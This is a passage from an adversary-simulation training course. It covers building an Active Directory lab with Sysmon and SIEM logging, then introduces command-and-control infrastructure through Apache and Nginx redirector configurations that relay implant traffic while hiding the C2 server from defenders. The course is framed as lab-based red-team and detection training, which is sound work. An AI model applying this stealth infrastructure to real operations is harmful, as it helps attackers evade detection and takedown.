Windows Pro/Enterprise/Server. Native, good performance. Management interface can be less intuitive for beginners compared to VMware/VirtualBox GUIs.\r\n*   **Cloud (Azure, AWS, GCP):** Offers scalability and access to different OS images easily. Can be more complex to set up internal networking and AD initially, and cost needs careful management (though free tiers exist). Provides experience with cloud environments, which is valuable.\r\n\r\nFor this foundational lab, we'll primarily focus on a **local lab** using a hypervisor like VMware or VirtualBox, as it's the most accessible and cost-effective way to get started. We'll touch on hybrid concepts later.\r\n\r\n**Minimum Lab Components:**\r\n\r\nTo simulate an enterprise environment and observe activities, you need at least:\r\n\r\n1.  **Domain Controller (DC):** A Windows Server VM acting as the heart of your Active Directory domain. This provides authentication, DNS, and central management.\r\n2.  **Target Workstation(s):** One or more Windows Client VMs (Windows 10/11) joined to the domain. These are where you'll execute payloads and practice techniques.\r\n3.  **Attacker Machine:** A VM (Kali Linux, Commando VM, or even just a Windows VM with necessary tools) from which you'll launch attacks. This machine might sit on a different network segment or need specific routing.\r\n4.  **SIEM/Logging Server:** A VM (Linux or Windows depending on the SIEM choice) to receive and analyze logs from the other machines. This is your \"defender's view.\"\r\n\r\n#### 2.2 Setting up Your Local Lab: Deploying the VMs\r\n\r\nLet's get the virtual machines themselves deployed.\r\n\r\n**Step 1: Obtain Necessary Software**\r\n\r\n*   **Hypervisor:** Download and install your chosen hypervisor (VMware, VirtualBox, Hyper-V).\r\n*   **Operating System ISOs:**\r\n    *   **Windows Server:** Download an evaluation ISO (e.g., Windows Server 2019 or 2022) from Microsoft's Evaluation Center.\r\n    *   **Windows Client:** Download an evaluation ISO (e.g., Windows 10 or 11) from Microsoft's Evaluation Center.\r\n    *   **Linux (for Attacker/SIEM):** Download an ISO for Kali Linux, Ubuntu Server, or Debian.\r\n\r\n**Step 2: Create the Virtual Machines**\r\n\r\nUsing your hypervisor, create new virtual machines for each component. Here are *minimum recommended* specs; adjust based on your host machine's resources:\r\n\r\n*   **Domain Controller (Windows Server):**\r\n    *   OS Type: Microsoft Windows (select appropriate version)\r\n    *   CPU: 2 cores\r\n    *   RAM: 4 GB\r\n    *   HDD: 60 GB (Dynamically allocated is fine for space saving)\r\n    *   Network Adapter: Set to a custom **Internal** or **Host-Only** network (we'll configure this specifically in the next section).\r\n*   **Target Workstation (Windows 10/11):**\r\n    *   OS Type: Microsoft Windows (select appropriate version)\r\n    *   CPU: 2 cores\r\n    *   RAM: 4 GB\r\n    *   HDD: 60 GB\r\n    *   Network Adapter: Set to the *same* custom **Internal** or **Host-Only** network as the DC.\r\n*   **Attacker Machine (Kali/Ubuntu):**\r\n    *   OS Type: Linux (select appropriate version)\r\n    *   CPU: 2 cores\r\n    *   RAM: 4 GB\r\n    *   HDD: 60 GB\r\n    *   Network Adapter 1: **NAT** (to access the internet for updates, tool downloads).\r\n    *   Network Adapter 2: Set to the *same* custom **Internal** or **Host-Only** network as the DC/Target (to interact with the lab).\r\n*   **SIEM Server (Ubuntu/Debian/Windows):**\r\n    *   OS Type: Linux or Windows\r\n    *   CPU: 2-4 cores (SIEM can be resource intensive)\r\n    *   RAM: 8 GB+ (More is better for SIEM)\r\n    *   HDD: 100 GB+ (Logs consume space!)\r\n    *   Network Adapter: Set to the *same* custom **Internal** or **Host-Only** network as the DC/Target.\r\n\r\n**Step 3: Install the Operating Systems**\r\n\r\nMount the ISOs to the respective VMs and go through the standard OS installation process for each.\r\n\r\n*   **Windows VMs:** Follow the on-screen prompts. Set a strong password for the Administrator account. Choose the \"Desktop Experience\" version for the server if you prefer a GUI.\r\n*   **Linux VMs:** Follow the distribution's installation guide. Create a non-root user account. Ensure SSH is installed and enabled if you plan to manage it remotely.\r\n\r\n> **Pro Tip:** After installing each OS but *before* making significant configuration changes (like promoting the DC), take a snapshot of the VM. This gives you a clean baseline to revert to if something goes wrong later. Install VMware Tools/Guest Additions in each VM for better performance and usability.\r\n\r\n#### 2.3 Configuring a Basic Active Directory Domain\r\n\r\nActive Directory is fundamental to most enterprise networks. Setting up a basic domain is crucial for simulating realistic scenarios involving domain users, group policies, and Windows authentication.\r\n\r\n**Step 1: Configure the Domain Controller's Network**\r\n\r\nOn your Windows Server VM (the future DC):\r\n1.  Open Network Connections (`ncpa.cpl`).\r\n2.  Right-click your network adapter and select \"Properties.\"\r\n3.  Select \"Internet Protocol Version 4 (TCP/IPv4)\" and click \"Properties.\"\r\n4.  Choose \"Use the following IP address\" and assign a static IP within your chosen internal network range (e.g., `192.168.100.10`).\r\n5.  Set the Subnet mask (e.g., `255.255.255.0`).\r\n6.  Leave Default gateway empty *if* this network is purely internal with no internet access. If using NAT on the host and routing through it, set the gateway IP. For a simple internal lab, no gateway is fine.\r\n7.  For **Preferred DNS server**, point it to *itself* (`127.0.0.1`). This server will become the DNS server for the domain.\r\n8.  Click OK.\r\n\r\n**Step 2: Install Active Directory Domain Services (AD DS)**\r\n\r\n1.  Open **Server Manager**.\r\n2.  Click \"Manage\" -> \"Add Roles and Features.\"\r\n3.  Click \"Next\" through the initial screens (Role-based or feature-based installation, select server).\r\n4.  Under \"Server Roles,\" check the box for \"**Active Directory Domain Services**.\"\r\n5.  Click \"Add Features\" when prompted for required features.\r\n6.  Click \"Next\" through Features (defaults are usually fine).\r\n7.  Click \"Next\" on the AD DS screen.\r\n8.  Click \"Install.\"\r\n\r\n**Step 3: Promote the Server to a Domain Controller**\r\n\r\n1.  Once the installation is complete, a flag notification will appear in Server Manager. Click the flag and select \"**Promote this server to a domain controller**.\"\r\n2.  In the Deployment Configuration wizard:\r\n    *   Select \"**Add a new forest**.\"\r\n    *   Enter a Root domain name (e.g., `mylabs.local`). Click \"Next.\"\r\n3.  Domain Controller Options:\r\n    *   Keep \"Domain Name System (DNS) server\" and \"Global Catalog (GC)\" checked.\r\n    *   Enter a Directory Services Restore Mode (DSRM) password. **Remember this password!** Click \"Next.\"\r\n4.  DNS Options: Ignore the DNS delegation warning for a lab. Click \"Next.\"\r\n5.  NetBIOS Domain Name: Verify the name (e.g., `MYLABS`). Click \"Next.\"\r\n6.  Paths: Keep default paths. Click \"Next.\"\r\n7.  Prerequisites Check: Review settings. Click \"Next.\"\r\n8.  Click \"**Install**.\" The server will configure AD DS and automatically reboot.\r\n\r\n**Step 4: Create Users and Groups**\r\n\r\nAfter the server reboots and becomes a DC:\r\n1.  Log in as the Administrator (using the password you set during OS install).\r\n2.  Open **Server Manager**.\r\n3.  Click \"Tools\" -> \"**Active Directory Users and Computers**.\"\r\n4.  Right-click your domain (`mylabs.local`) -> \"New\" -> \"**Organizational Unit**.\" Name it something logical like `LabUsers`.\r\n5.  Right-click the new OU (`LabUsers`) -> \"New\" -> \"**User**.\"\r\n    *   Fill in First name, Last name, User logon name (e.g., `analyst`). Click \"Next.\"\r\n    *   Set a password. **Uncheck** \"User must change password at next logon\" and **check** \"Password never expires\" for lab convenience (less realistic, but easier). Click \"Next\" -> \"Finish.\"\r\n6.  (Optional) Create a Group: Right-click `LabUsers` OU -> \"New\" -> \"**Group**.\" Name it `LabAdmins`. Set scope/type (Global, Security). Click OK.\r\n7.  (Optional) Add User to Group: Double-click the `LabAdmins` group -> \"Members\" tab -> \"Add...\". Type the user logon name (`analyst`) and click \"Check Names.\" Click OK -> OK.\r\n\r\n**Step 5: Join Client Machine to the Domain**\r\n\r\nOn your Windows Client VM:\r\n1.  Configure its network adapter to use a static IP or DHCP, but crucially, set its **Preferred DNS server** to the IP address of your Domain Controller (e.g., `192.168.100.10`).\r\n2.  Right-click the Start button -> \"System\" (or go to Settings -> System -> About).\r\n3.  Click \"**Rename this PC (Advanced)**\" or \"Advanced system settings\" -> \"Computer Name\" tab.\r\n4.  Click \"**Change...**\".\r\n5.  Under \"Member of,\" select \"Domain\" and enter your domain name (e.g., `mylabs.local`).\r\n6.  Click OK. You'll be prompted for domain credentials. Enter the Administrator username and password *of the domain* (the one you set during the DC promotion).\r\n7.  Click OK. You should see a welcome message.\r\n8.  Click OK and reboot the client machine when prompted.\r\n\r\nAfter rebooting, you should be able to log in using a domain user account (e.g., `MYLABS\\analyst` or `analyst@mylabs.local` and the password you set).\r\n\r\n#### 2.4 Basic Network Configuration\r\n\r\nUnderstanding how your VMs talk to each other and the outside world is key.\r\n\r\n*   **Internal/Host-Only Network:** This is the recommended setup for your lab network segment containing the DC, Target, and SIEM. VMs on this network can *only* communicate with each other and potentially the host machine (depending on hypervisor config). They cannot access the internet unless routed through another VM or the host. This isolates your lab traffic.\r\n*   **NAT (Network Address Translation):** This adapter type allows a VM to access the internet by sharing the host's IP address. The host performs NAT, translating the VM's private IP to the host's public IP. VMs on a NAT network *cannot* be easily accessed from the host or other networks (inbound connections are blocked by default). Your Attacker VM might use this for tool downloads/updates.\r\n*   **Bridged:** The VM gets an IP address on the *same* network as your host machine. This is generally **not recommended** for offensive labs as your lab traffic could interfere with or be visible on your home/work network.\r\n\r\n**Recommended Lab Network Setup:**\r\n\r\n*   Create a dedicated **Internal** or **Host-Only** network in your hypervisor settings (e.g., name it `CRTO_Lab_Net`). Assign it a private IP range (e.g., 192.168.100.0/24).\r\n*   Configure the DC with a static IP on this network (e.g., 192.168.100.10), pointing its DNS to itself.\r\n*   Configure the Target and SIEM VMs with static IPs or DHCP on this network, pointing their DNS to the DC's IP (192.168.100.10).\r\n*   Configure the Attacker VM with *two* network adapters:\r\n    *   One NAT adapter for internet access.\r\n    *   One adapter on the `CRTO_Lab_Net` (192.168.100.0/24) to interact with lab machines.\r\n\r\n> **Troubleshooting Tip:** If VMs can't communicate, check:\r\n> 1.  Are they on the *same* virtual network (Internal/Host-Only)?\r\n> 2.  Are their IP addresses and subnet masks correct for that network?\r\n> 3.  Is the DNS server setting correct (pointing to the DC)?\r\n> 4.  Are Windows Firewalls blocking traffic? (For lab convenience, you might temporarily disable Windows Firewall on target VMs, but be aware this reduces realism).\r\n\r\n#### 2.5 Introduction to Hybrid Labs (Conceptual)\r\n\r\nWhile we focus on local labs, it's worth understanding how hybrid labs work, as CRTO involves cloud components.\r\n\r\nA hybrid lab typically involves:\r\n*   A local network (your VMs).\r\n*   A cloud network (e.g., Azure VNet, AWS VPC) with VMs.\r\n*   A secure connection between them (VPN or Peering).\r\n\r\nThis allows you to simulate attacking cloud resources from an on-premise perspective, or simulate C2 infrastructure hosted in the cloud communicating with on-premise implants.\r\n\r\n*   **Azure/AWS Free Tier:** You can often create small VMs and set up basic networking using free tier credits. This is a great way to experiment.\r\n*   **Networking:** You'll need to understand Virtual Networks, Subnets, Network Security Groups (firewalls), and potentially VPN Gateways or Peering connections to link your local lab network to the cloud network.\r\n*   **Domain Services:** You could extend your on-prem AD to the cloud, or set up Azure AD DS in the cloud.\r\n\r\nFor this module, just grasp the *concept* – extending your lab environment beyond your local machine to include cloud components, mirroring how many modern enterprises operate. We won't build a full hybrid lab *yet*, but the local AD setup is a prerequisite for understanding identity in both environments.\r\n\r\n#### 2.6 Deploying and Configuring Sysmon\r\n\r\nSysmon (System Monitor) is an essential Windows Sysinternals tool that provides detailed information about process creation, network connections, file system changes, registry modifications, and much more. It's *critical* for understanding what activity looks like from a detection perspective.\r\n\r\n**Step 1: Download Sysmon**\r\n\r\nDownload the Sysmon zip file from the Microsoft Sysinternals page. Extract it to a known location (e.g., `C:\\Tools\\Sysmon`).\r\n\r\n**Step 2: Obtain a Sysmon Configuration File**\r\n\r\nRunning Sysmon without a configuration file generates an overwhelming amount of noise. A good configuration file filters out benign activity and highlights events relevant to security monitoring. The most widely used and recommended configuration is SwiftOnSecurity's `sysmon-config`.\r\n\r\n*   Download the latest `sysmonconfig-export.xml` from the SwiftOnSecurity/Sysmon repository on GitHub. Save it in the same folder as your Sysmon executable.\r\n\r\n**Step 3: Install Sysmon with the Configuration File**\r\n\r\nOpen an **Administrator** Command Prompt or PowerShell window on your target workstation VM. Navigate to the directory where you saved `Sysmon64.exe` and the config file.\r\n\r\nExecute the following command:\r\n\r\n```cmd\r\nSysmon64.exe -i sysmonconfig-export.xml\r\n```\r\n\r\n*   `-i`: Installs the Sysmon service.\r\n*   `sysmonconfig-export.xml`: Specifies the configuration file to use.\r\n\r\nYou should see output indicating that the service was installed successfully.\r\n\r\n**Step 4: Verify Sysmon is Running and Logging**\r\n\r\n1.  Check the Sysmon service: Open Services (`services.msc`) and verify that the \"Sysmon\" service is running.\r\n2.  Check Event Viewer: Open Event Viewer (`eventvwr.msc`). Navigate to `Applications and Services Logs` -> `Microsoft` -> `Windows` -> `Sysmon` -> `Operational`.\r\n3.  You should see recent events logged by Sysmon. Event ID 1 is Process Creation, which is very common. Try running `calc.exe` and refresh the Sysmon Operational log – you should see an Event ID 1 for `calc.exe`.\r\n\r\n**Key Sysmon Event IDs to Pay Attention To (Based on SwiftOnSecurity config & CRTO relevance):**\r\n\r\n*   **Event ID 1: Process Creation:** Logs every new process with parent process, command line, user, hash, etc. (Crucial for seeing execution).\r\n*   **Event ID 3: Network Connection:** Logs TCP/UDP connections with source/destination IPs, ports, process name. (Crucial for seeing C2 callbacks).\r\n*   **Event ID 6: Driver Loaded:** Logs information about a driver being loaded.\r\n*   **Event ID 7: Image Loaded:** Logs when a module (DLL) is loaded into a process.\r\n*   **Event ID 8: CreateRemoteThread:** Logs when a thread is created in another process. (Relevant for process injection).\r\n*   **Event ID 11: FileCreate:** Logs file creation. (Useful for tracking dropped payloads).\r\n*   **Event ID 12/13/14: Registry Event:** Logs registry key/value create/delete/rename/set. (Crucial for persistence).\r\n*   **Event ID 15: FileCreateStreamHash:** Logs when a named stream is created (often used for malicious purposes).\r\n*   **Event ID 17/18: Pipe Event:** Logs named pipe creation/connection. (Used for inter-process communication, sometimes maliciously).\r\n*   **Event ID 22: DNSEvent:** Logs DNS queries. (Crucial for DNS C2 or resolving malicious domains).\r\n*   **Event ID 23: FileDelete:** Logs when a file is deleted.\r\n*   **Event ID 26: FileChangeTime:** Logs when a file timestamp is changed (timestomping).\r\n\r\nUnderstanding these event IDs is key to analyzing logs from an adversary simulation.\r\n\r\n#### 2.7 Setting up Basic Logging Infrastructure (SIEM)\r\n\r\nSeeing the raw logs in Event Viewer is useful, but for analysis, correlation, and searching across multiple machines, you need a SIEM (Security Information and Event Management) or logging platform. We'll focus on getting logs *into* a platform.\r\n\r\n**Option 1: Splunk Free (Recommended for beginners)**\r\n\r\nSplunk is powerful and widely used. Splunk Free is limited (500 MB/day ingestion) but sufficient for a basic lab.\r\n\r\n**Step 1: Install Splunk Enterprise (Free License)**\r\n\r\n*   Download Splunk Enterprise from the Splunk website.\r\n*   Install it on your SIEM Server VM (Linux or Windows). Follow the installation wizard.\r\n*   During installation, you'll set an admin username and password.\r\n*   After installation, access the web interface (usually `http://<SIEM_IP>:8000`). Log in.\r\n\r\n**Step 2: Install Splunk Universal Forwarder (UF) on Target VM**\r\n\r\nSplunk Universal Forwarder is a lightweight agent that sends logs from endpoints to the Splunk server.\r\n\r\n*   Download the Splunk Universal Forwarder for Windows from the Splunk website.\r\n*   Copy the installer to your target workstation VM.\r\n*   Run the installer as Administrator.\r\n*   Follow the wizard. Key steps:\r\n    *   Accept license.\r\n    *   Choose installation directory.\r\n    *   **Deployment Server:** Skip this (unless you set one up).\r\n    *   **Receiving Indexer:** This is where you point the UF to your Splunk server. Enter the IP address of your Splunk server VM and the receiving port (we'll configure this next, default is 9997).\r\n    *   **Login Information:** Enter the admin credentials for your Splunk server (set in Step 1).\r\n    *   **Inputs:** You can configure inputs later, skip this for now.\r\n*   Finish the installation.\r\n\r\n**Step 3: Configure Universal Forwarder Inputs (What logs to send)**\r\n\r\nYou need to tell the UF *which* logs to send. You can do this via the GUI or by editing configuration files. Editing files is often more precise for specific logs like Sysmon.\r\n\r\n*   On the target workstation VM, navigate to the UF's configuration directory: `C:\\Program Files\\SplunkUniversalForwarder\\etc\\system\\local\\`\r\n*   Create or edit the `inputs.conf` file. Add the following stanzas:\r\n\r\n```ini\r\n[WinEventLog:Security]\r\ndisabled = false\r\n\r\n[WinEventLog:System]\r\ndisabled = false\r\n\r\n[WinEventLog:Application]\r\ndisabled = false\r\n\r\n[WinEventLog:Microsoft-Windows-Sysmon/Operational]\r\ndisabled = false\r\n```\r\n\r\n*   Save the `inputs.conf` file.\r\n*   Restart the Splunk Universal Forwarder service on the target VM: Open Services (`services.msc`), find \"SplunkForwarder\", right-click and restart.\r\n\r\n**Step 4: Configure Splunk Server to Receive Data**\r\n\r\nOn your Splunk Server VM (via the web interface `http://<SIEM_IP>:8000`):\r\n\r\n1.  Click \"Settings\" (top right).\r\n2.  Under \"Data,\" click \"Data Inputs.\"\r\n3.  Under \"Local inputs,\" click \"TCP\" (or \"UDP\" if you prefer, but TCP is reliable).\r\n4.  Click \"**New Local TCP Input**.\"\r\n5.  **Port:** Enter the port you specified during the UF installation (default 9997).\r\n6.  **Source type:** Click \"Select.\" Search for `XmlWinEventLog` and select it (this sourcetype is good for structured Windows XML events like Sysmon).\r\n7.  **Index:** Keep the default (`main`) or create a new index if you prefer.\r\n8.  Click \"Review\" -> \"Submit.\"\r\n\r\nYour Splunk server is now listening for logs from the UF on the target VM.\r\n\r\n**Option 2: ELK Stack (Elasticsearch, Logstash, Kibana)**\r\n\r\nELK is free and open-source, powerful but generally requires more manual configuration than Splunk.\r\n\r\n*   **Components:**\r\n    *   **Elasticsearch:** The NoSQL database that stores logs.\r\n    *   **Logstash:** A server-side processing pipeline that ingests data from various sources, transforms it, and sends it to Elasticsearch. (Filebeat can often send directly to ES now, making Logstash optional for simple setups).\r\n    *   **Kibana:** The web interface for searching, analyzing, and visualizing logs stored in Elasticsearch.\r\n    *   **Filebeat:** A lightweight agent (like Splunk UF) installed on endpoints to forward logs.\r\n*   **Setup Overview:**\r\n    1.  Install Elasticsearch and Kibana on your SIEM Server VM.\r\n    2.  Install Filebeat on your target workstation VM.\r\n    3.  Configure Filebeat to read Windows Event Logs (Security, System, Application, and the Sysmon Operational log). Filebeat has specific modules for Windows Event Logs and Sysmon that simplify configuration.\r\n    4.  Configure Filebeat to send logs to your Elasticsearch instance.\r\n    5.  Start the services (Elasticsearch, Kibana, Filebeat).\r\n    6.  Access Kibana (usually `http://<SIEM_IP>:5601`), configure an index pattern (e.g., `filebeat-*`), and start exploring data in the \"Discover\" tab.\r\n\r\nWhile ELK is a great option, for this course's focus on *using* the logs rather than deep SIEM administration, Splunk Free often has a gentler learning curve for getting data ingested quickly. Choose the path you're most comfortable exploring.\r\n\r\n#### 2.8 Verifying Log Collection\r\n\r\nThe most important step after setting up logging is ensuring the logs are actually arriving and are searchable.\r\n\r\n**In Splunk:**\r\n\r\n1.  Go to the Splunk web interface (`http://<SIEM_IP>:8000`).\r\n2.  Click \"Search & Reporting\" (or \"Search\" in newer versions).\r\n3.  In the search bar, enter `index=main` (replace `main` if you used a different index). This searches all data in the 'main' index.\r\n4.  To see the different types of logs arriving, add `| stats count by sourcetype`. You should see `WinEventLog:Security`, `WinEventLog:System`, `WinEventLog:Application`, and critically, `XmlWinEventLog` (or whatever sourcetype you assigned Sysmon logs).\r\n5.  To specifically search Sysmon logs, use `index=main sourcetype=XmlWinEventLog`. Look at the \"Time Picker\" (top right) to ensure you're looking at recent data.\r\n6.  To test in real-time, go to your target VM, open Command Prompt, and type `calc.exe`."
    },
    {
      "title": "module_3",
      "description": "module_3 Overview",
      "order": 3,
      "content": "Alright team, let's dive headfirst into the operational side! If Module 1 was our strategic planning session and Module 2 was building the battlefield, then Module 3 is setting up our essential lifeline – the Command and Control (C2) infrastructure. Think of this as establishing the secret communication network that our deployed implants will use to call home, receive instructions, and send back valuable intelligence. Without a solid, stealthy C2, our simulation is dead in the water the moment the implant executes. This is where we start building the *actual* operational components. Let's get our hands dirty!\r\n\r\n---\r\n\r\n## CRTO Prep Part 1: Adversary Simulation Foundations\r\n\r\n### Module 3: Establishing Your C2 Infrastructure\r\n\r\n*   **Module Objective:** By the end of this module, learners will be able to design and configure basic C2 infrastructure components including redirectors and payload hosting mechanisms.\r\n\r\n---\r\n\r\nWelcome back! You've got your lab setup, your domain is running, and logging is hopefully humming along in the background. Now, we need to think about the *other* side of the equation: the attacker infrastructure. This isn't just about having a server; it's about having a *resilient* and *stealthy* way to communicate with compromised machines. Adversaries don't just point their malware directly back to their home IP; they use layers and techniques to hide their true location and blend in. That's what this module is all about.\r\n\r\n#### 3.1 Command and Control (C2) Concepts\r\n\r\n*   **What is C2 and Why is it Needed?**\r\n    *   Once you get code running on a target machine (initial access!), you need to interact with it. You need to issue commands, upload/download files, pivot to other machines, and manage multiple compromised systems. That's the role of the C2 framework and its associated infrastructure.\r\n    *   Think of the implant as a remote agent, and the C2 server as mission control. The implant \"calls home\" (beacons) to the C2 server, receives tasks, executes them, and reports back the results.\r\n    *   Without C2, your initial execution is often a one-off event, limiting your ability to conduct further operations.\r\n\r\n*   **Types of C2 Channels:** Adversaries use various network protocols to communicate, trying to blend in with legitimate traffic.\r\n    *   **HTTP/HTTPS:** The most common. Traffic looks like web browsing. HTTPS provides encryption, making inspection harder (though metadata is still visible). Often goes through web proxies, which can be both a help (blending) and a hindrance (inspection points).\r\n    *   **DNS:** Data is encoded within DNS queries and responses. Very stealthy as DNS traffic is ubiquitous and often less scrutinized than HTTP. Slower and transmits less data per transaction.\r\n    *   **SMB:** Communication over the Server Message Block protocol. Useful for lateral movement within a network and controlling implants on the same segment or domain. Looks like internal file/printer sharing traffic.\r\n    *   **Other:** TCP, UDP, ICMP, specialized protocols, even legitimate services like Twitter or Discord (less common for standard implants, more for exfiltration or dead drops).\r\n\r\n*   **Characteristics of a Good C2:**\r\n    *   **Stealthy:** Blends in with normal network traffic, avoids common detection signatures.\r\n    *   **Resilient:** Can handle network interruptions, multiple implants, and potential infrastructure takedowns (hence the need for redirectors).\r\n    *   **Flexible:** Supports various payload types, communication protocols, and operational commands.\r\n    *   **Manageable:** Provides operators with a clear interface to control implants.\r\n    *   **Extensible:** Allows for adding new capabilities (e.g., post-exploitation modules).\r\n\r\n#### 3.2 Introduction to Redirectors\r\n\r\n*   **Purpose and Benefits:**\r\n    *   Your *actual* C2 server (where your C2 framework software runs) contains sensitive operational data and is the heart of your operation. If a defender identifies your C2 server's IP address, they can block it, analyze its traffic, and potentially report it, leading to takedown.\r\n    *   A **redirector** acts as a proxy or a relay between the implant and your C2 server. The implant talks *only* to the redirector, and the redirector forwards the traffic to the C2 server.\r\n    *   **Benefits:**\r\n        *   **OpSec (Operational Security):** Hides the true IP of your C2 server. If a redirector is discovered and blocked, you lose *that specific communication path*, but your main C2 server remains safe. You can quickly spin up a new redirector.\r\n        *   **Scalability:** You can use multiple redirectors pointing to the same C2 server.\r\n        *   **Flexibility:** Redirectors can modify traffic (e.g., change headers, filter requests) before forwarding it, aiding in stealth.\r\n        *   **Blinding Defenders:** Defenders investigating traffic will see the redirector's IP, not your C2 server's IP.\r\n\r\n*   **Analogy:** Think of your C2 server as your secret base. You don't tell your agents (implants) the address of the base. Instead, you tell them to send messages to a specific P.O. Box (the redirector). You then pick up the mail from the P.O. Box and bring it back to your base. If one P.O. Box is compromised, you just set up a new one and tell your agents the new address; the base remains hidden.\r\n\r\n#### 3.3 Configuring Redirectors\r\n\r\nThis is a hands-on section. We'll focus on the most common and flexible redirector types: Apache and Nginx, and a simple alternative, Socat. We'll assume a Linux server (like Ubuntu or Kali) for the redirector.\r\n\r\n**Prerequisites:**\r\n\r\n*   A Linux VM or cloud instance (e.g., Ubuntu Server 20.04/22.04, Kali Linux).\r\n*   Root or `sudo` access on the Linux machine.\r\n*   Basic Linux command-line familiarity.\r\n*   **Crucially:** You need the IP address and port of your *actual* C2 server's beacon listener. For this module's project, this might just be an internal IP and port for testing, but in a real scenario, your C2 server would likely be elsewhere (another VPS, etc.). Let's assume your C2 server is at `192.168.1.100` and its HTTP beacon listener is on port `8080`. Your redirector has a public IP (or an IP reachable by your target VM in the lab, let's say `192.168.1.50`) and will listen on port `80`.\r\n\r\n##### Method 1: Apache2 with mod_rewrite and mod_proxy\r\n\r\nApache is a powerful web server that can also act as a reverse proxy and redirector using its modules.\r\n\r\n**Steps:**\r\n\r\n1.  **Update and Install Apache2:**\r\n    ```bash\r\n    sudo apt update\r\n    sudo apt install apache2 -y\r\n    ```\r\n\r\n2.  **Enable Necessary Modules:** We need `mod_rewrite` for pattern-based redirection and `mod_proxy` and `mod_proxy_http` to forward traffic.\r\n    ```bash\r\n    sudo a2enmod rewrite\r\n    sudo a2enmod proxy\r\n    sudo a2enmod proxy_http\r\n    ```\r\n    You might need to restart Apache after enabling modules:\r\n    ```bash\r\n    sudo systemctl restart apache2\r\n    ```\r\n\r\n3.  **Configure a Virtual Host:** We'll modify the default Apache configuration or create a new one. It's often cleaner to create a new file in `sites-available`. Let's edit the default for simplicity, but be aware of best practices for real deployments.\r\n    ```bash\r\n    sudo nano /etc/apache2/sites-available/000-default.conf\r\n    ```\r\n    Inside the `<VirtualHost *:80>` block, add the following lines (before `</VirtualHost>`). Replace `YOUR_C2_IP` and `YOUR_C2_PORT`.\r\n\r\n    ```apacheconf\r\n    # Enable Rewrite Engine for this Virtual Host\r\n    RewriteEngine On\r\n\r\n    # Define the C2 server address\r\n    # This isn't strictly necessary but can make rules cleaner\r\n    # DefineMap c2_server txt:/dev/stdin\r\n    # 1 c2_server_value\r\n    # RewriteRule ^(.*)$ ${c2_server:$1} [P,L] # This isn't standard, just illustrating the concept\r\n\r\n    # --- Example Configuration ---\r\n    # This example assumes your C2 beacon listens on /mypath and everything else\r\n    # goes to a default handler or returns 404.\r\n    # A more flexible config would forward based on the C2 framework's profile.\r\n    # Let's forward everything for simplicity first, then refine.\r\n\r\n    # Option 1: Simple Proxy All Traffic\r\n    # This forwards ALL requests arriving at the redirector on port 80\r\n    # to your C2 server's specific port (e.g., 8080).\r\n    # This is good for basic setups where the C2 framework handles all paths.\r\n    ProxyPreserveHost On # Passes the original Host header\r\n    ProxyRequests Off    # Disable forward proxying (security)\r\n    ProxyVia Full        # Add Via header (can be removed for stealth)\r\n\r\n    <Proxy *>\r\n        Require all granted\r\n    </Proxy>\r\n\r\n    # Forward all requests to the C2 server\r\n    # The [P] flag means \"proxy\" and [L] means \"last rule\"\r\n    RewriteRule ^(.*)$ http://YOUR_C2_IP:YOUR_C2_PORT/$1 [P,L]\r\n\r\n    # Option 2: More Granular (Example - Requires C2 Profile Matching)\r\n    # Let's say your C2 profile beacons to /mypath and gets tasks from /tasks\r\n    # And your payload is hosted at /payload.exe (different server or same)\r\n\r\n    # Redirect /mypath requests to C2 beacon listener\r\n    RewriteRule ^/mypath$ http://YOUR_C2_IP:YOUR_C2_PORT/mypath [P,L]\r\n    RewriteRule ^/mypath/(.*)$ http://YOUR_C2_IP:YOUR_C2_PORT/mypath/$1 [P,L] # Handle potential trailing data\r\n\r\n    # Redirect /tasks requests to C2 tasking listener (often same as beacon)\r\n    # RewriteRule ^/tasks$ http://YOUR_C2_IP:YOUR_C2_PORT/tasks [P,L]\r\n    # RewriteRule ^/tasks/(.*)$ http://YOUR_C2_IP:YOUR_C2_PORT/tasks/$1 [P,L] # Handle potential trailing data\r\n\r\n    # Example: Redirect /payload.exe to a DIFFERENT server hosting the payload (e.g., 192.168.1.101:80)\r\n    # RewriteRule ^/payload.exe$ http://192.168.1.101:80/payload.exe [P,L]\r\n\r\n\r\n    # Default rule: If none of the above match, maybe redirect to a benign site or return 404\r\n    # This helps avoid exposing your C2 if someone browses random paths\r\n    # RewriteRule ^(.*)$ http://www.google.com/$1 [R=302,L] # Redirects to Google\r\n    # Or just let it hit the default Apache 404/index page if no other rules match.\r\n    # For simplicity for the project, Option 1 (Proxy All) is easiest to start.\r\n    ```\r\n    **For the Module Project, start with Option 1 (Simple Proxy All Traffic).** Replace `YOUR_C2_IP` and `YOUR_C2_PORT` with your actual C2 listener details.\r\n\r\n4.  **Test Configuration and Restart:**\r\n    ```bash\r\n    sudo apache2ctl configtest\r\n    ```\r\n    If `Syntax OK`, restart Apache:\r\n    ```bash\r\n    sudo systemctl restart apache2\r\n    ```\r\n\r\n5.  **Firewall:** Ensure your redirector's firewall allows traffic on port 80 (or whatever port you configured). If using `ufw`:\r\n    ```bash\r\n    sudo ufw allow 80/tcp\r\n    sudo ufw enable # if firewall is not active\r\n    ```\r\n\r\n##### Method 2: Nginx Reverse Proxy\r\n\r\nNginx is known for its performance and is excellent at reverse proxying.\r\n\r\n**Steps:**\r\n\r\n1.  **Update and Install Nginx:**\r\n    ```bash\r\n    sudo apt update\r\n    sudo apt install nginx -y\r\n    ```\r\n\r\n2.  **Configure a Server Block:** We'll modify the default Nginx configuration or create a new one.\r\n    ```bash\r\n    sudo nano /etc/nginx/sites-available/default\r\n    ```\r\n    Inside the `server` block that listens on port 80, modify or add `location` blocks. Replace `YOUR_C2_IP` and `YOUR_C2_PORT`.\r\n\r\n    ```nginx\r\n    server {\r\n        listen 80 default_server;\r\n        listen [::]:80 default_server;\r\n\r\n        # SSL configuration goes here if doing HTTPS redirector\r\n\r\n        root /var/www/html; # Default web root - can be used for payload hosting\r\n\r\n        # Add index.html to the list if you want to serve a default page\r\n        index index.html index.htm index.nginx-debian.html;\r\n\r\n        server_name _; # Or your domain name\r\n\r\n        # --- Example Configuration ---\r\n        # Option 1: Simple Proxy All Traffic\r\n        # This forwards ALL requests arriving at the redirector on port 80\r\n        # to your C2 server's specific port (e.g., 8080).\r\n        location / {\r\n            proxy_pass http://YOUR_C2_IP:YOUR_C2_PORT;\r\n            proxy_set_header Host $host; # Passes the original Host header\r\n            proxy_set_header X-Real-IP $remote_addr; # Optional: Pass client IP\r\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # Optional: Pass client IP\r\n        }\r\n\r\n        # Option 2: More Granular (Example - Requires C2 Profile Matching)\r\n        # Let's say your C2 profile 